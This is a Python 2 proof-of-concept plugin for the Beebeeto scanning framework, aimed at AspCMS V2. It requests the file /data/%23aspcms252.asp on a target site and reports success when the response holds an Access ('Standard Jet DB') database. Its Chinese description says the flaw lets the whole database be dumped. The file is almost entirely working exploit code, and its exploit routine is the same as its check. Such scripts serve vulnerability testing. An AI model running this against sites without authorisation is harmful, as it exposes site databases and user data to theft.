#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2
import cookielib

from baseframe import BaseFrame

class NoExceptionCookieProcesser(urllib2.HTTPCookieProcessor):
  def http_error_403(self, req, fp, code, msg, hdrs):
    return fp
  def http_error_400(self, req, fp, code, msg, hdrs):
    return fp
  def http_error_500(self, req, fp, code, msg, hdrs):
    return fp


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0152',
            'name': 'AspCMS V2 /aspcms252.asp 数据库泄露漏洞 POC',
            'author': 'oneroy',
            'create_date': '2015-11-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer3_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'AspCMS',
            'vul_version': ['V2'],
            'type': 'Database Found',
            'tag': ['AspCMS漏洞', '信息泄露漏洞', '/aspcms252.asp', 'asp'],
            'desc': '由于AspCMS的过滤不严格，导致数据库泄露，造成直接脱库',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-060483',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/data/%23aspcms252.asp'
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        cookie = cookielib.CookieJar()
        cookie_handler = NoExceptionCookieProcesser(cookie)
        opener = urllib2.build_opener(cookie_handler, urllib2.HTTPHandler)
        opener.open(verify_url)
        urllib2.install_opener(opener)
        content = urllib2.urlopen(verify_url).read()
        if content:
            if "Standard Jet DB" in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())